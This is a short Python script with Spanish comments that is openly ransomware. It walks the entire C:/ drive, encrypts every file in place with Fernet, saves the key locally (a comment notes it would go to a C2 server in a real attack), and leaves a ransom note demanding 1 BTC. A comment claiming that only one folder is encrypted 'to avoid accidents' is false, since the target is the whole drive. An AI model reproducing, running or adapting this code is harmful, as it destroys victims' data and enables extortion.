import os
from cryptography.fernet import Fernet

# Solo ciframos esta carpeta para evitar accidentes
DIRECTORIO_OBJETIVO = "C:/"

def generar_llave():
    """Genera la llave de secuestro (en un ataque real, se enviaría al C2)."""
    llave = Fernet.generate_key()
    with open("clave_maestra.key", "wb") as key_file:
        key_file.write(llave)
    return llave

def cifrar_archivos(llave):
    f = Fernet(llave)
    
    for raiz, dirs, archivos in os.walk(DIRECTORIO_OBJETIVO):
        for archivo in archivos:
            ruta_completa = os.path.join(raiz, archivo)
            
            with open(ruta_completa, "rb") as file_data:
                contenido = file_data.read()
            
            contenido_cifrado = f.encrypt(contenido)
            
            with open(ruta_completa, "wb") as file_data:
                file_data.write(contenido_cifrado)
            
            print(f"[!] CIFRADO: {archivo}")

def soltar_nota():
    nota = """
    ====================================================
    ¡TODOS TUS ARCHIVOS HAN SIDO CIFRADOS!
    ====================================================
    Para recuperar tus documentos, debes enviar 1 BTC
    a la direccion de la billetera.
    
    No intentes cambiar la extension de los archivos.
    ====================================================
    """
    with open(f"{DIRECTORIO_OBJETIVO}/LEEME_RESCATE.txt", "w") as f:
        f.write(nota)

if __name__ == "__main__": 
    key = generar_llave()
    cifrar_archivos(key)
    soltar_nota()
    print("\n[+] Ataque completado. Revisa la carpeta de documentos.")